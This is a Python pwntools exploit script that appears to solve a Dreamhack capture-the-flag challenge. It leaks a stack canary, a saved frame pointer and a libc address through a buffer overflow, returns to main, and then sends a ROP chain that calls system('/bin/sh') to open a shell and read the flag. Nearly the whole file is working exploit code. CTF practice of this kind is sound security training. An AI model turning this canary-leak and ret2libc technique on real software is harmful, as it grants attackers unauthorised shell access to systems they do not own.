#!/usr/bin/env python3
from pwn import *
import binascii
import sys
import subprocess
import time

exe_path = 'prob_patched'
HOST = 'host8.dreamhack.games'
PORT = 23383

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*main+280
b*main+310
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# add payload, script here

# step 1
# leak canary + saved rbp (stack)
sla(b'BOF\n', b'A' * 168)
p.recvuntil(b'A' * 168 + b'\n')
leak = b'\x00' + p.recv(7)
canary = u64(leak)
leak = p.recv(6)
leak = leak.ljust(8, b'\x00')
stack_leak = u64(leak)
log.info(f'canary: {hex(canary)}')
log.info(f'stack leak: {hex(stack_leak)}')
# start from mov rax before call rax
sa(b'BOF\n', b'A' * 168 + p64(canary) + p64(stack_leak) + p16(0xa1b0))

# step 2
sla(b'BOF\n', b'B' * 183)
# leak libc + ret2main
p.recvuntil(b'B' * 183 + b'\n')
leak = p.recv(6)
leak = leak.ljust(8, b'\x00')
libc_leak = u64(leak)
libc.address = libc_leak - 0x2a1ca
# gadget
pop_rdi = 0x000000000010f78b + libc.address
sys = libc.sym['system']
binsh = next(libc.search(b'/bin/sh'))
ret = libc.address + 0x000000000002882f
log.info(f'libc leak: {hex(libc_leak)}')
log.info(f'libc base: {hex(libc.address)}')

# log.info(f'pop rdi: {hex(pop_rdi)}')
# log.info(f'system: {hex(sys)}')
# log.info(f'bin_sh: {hex(binsh)}')
# log.info(f'ret: {hex(ret)}')

# ROP
payload = flat(
    ret,ret,ret,ret,ret,ret,ret,ret,ret,ret,ret,ret,ret,ret,ret,ret,ret,ret, 
    pop_rdi,
    binsh,
    sys,
    canary,
    stack_leak-0x158 # align to prev rbp
)
payload += p16(0x99d2)
sa(b'BOF\n', payload)
sl(b'cat flag')
p.interactive()